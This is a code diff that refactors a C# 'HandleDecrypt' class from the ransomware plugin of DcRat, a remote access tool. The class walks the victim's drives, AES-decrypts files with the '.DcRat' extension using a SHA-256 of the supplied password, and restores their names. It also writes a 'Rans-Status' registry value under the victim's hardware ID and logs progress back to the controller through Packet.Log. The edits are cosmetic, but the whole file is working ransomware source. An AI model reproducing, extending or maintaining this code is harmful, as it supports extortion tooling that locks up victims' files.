@@ -1,20 +1,18 @@
-﻿using Microsoft.VisualBasic.CompilerServices;
-using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.IO;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
+using Microsoft.VisualBasic.CompilerServices;
+using Microsoft.Win32;
 
 namespace Plugin.Handler
 {
     public class HandleDecrypt
     {
+        private readonly object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
         public string Pass;
-        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
-        
+
         public void BeforeDec()
         {
             new Thread(Dec).Start();
@@ -24,7 +22,8 @@ namespace Plugin.Handler
         {
             try
             {
-                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Decryption in progress...");
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status",
+                    "Decryption in progress...");
                 Packet.Log("Decrypting...");
                 System_Driver(Pass);
                 Fix_Drivers(Pass);
@@ -35,7 +34,7 @@ namespace Plugin.Handler
             }
             catch (Exception ex)
             {
-                
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -51,7 +50,7 @@ namespace Plugin.Handler
                 var Driver = new DriveInfo(drive);
                 if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     Dir_Dec(DriverPath, password);
                 }
             }
@@ -64,7 +63,7 @@ namespace Plugin.Handler
                 var Driver = new DriveInfo(drive);
                 if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     Dir_Dec(DriverPath, password);
                 }
             }
@@ -99,23 +98,23 @@ namespace Plugin.Handler
 
         public void File_Dec(string file, string key)
         {
-            try 
+            try
             {
                 if (file.EndsWith(".DcRat"))
                 {
                     var B2Dec = File.ReadAllBytes(file);
-                    var KeyBytes = System.Text.Encoding.UTF8.GetBytes(key);
+                    var KeyBytes = Encoding.UTF8.GetBytes(key);
                     KeyBytes = SHA256.Create().ComputeHash(KeyBytes);
                     var BytesDec = AES_Dec(B2Dec, KeyBytes);
                     File.WriteAllBytes(file, BytesDec);
-                    string exten = Path.GetExtension(file);
-                    string result = file.Substring(0, file.Length - exten.Length);
+                    var exten = Path.GetExtension(file);
+                    var result = file.Substring(0, file.Length - exten.Length);
                     File.Move(file, result);
                 }
             }
             catch (Exception ex)
             {
-                
+                Console.WriteLine(ex.Message);
             }
         }
 
@@ -132,7 +131,7 @@ namespace Plugin.Handler
             }
             catch (Exception ex)
             {
-                
+                Console.WriteLine(ex.Message);
             }
         }
     }
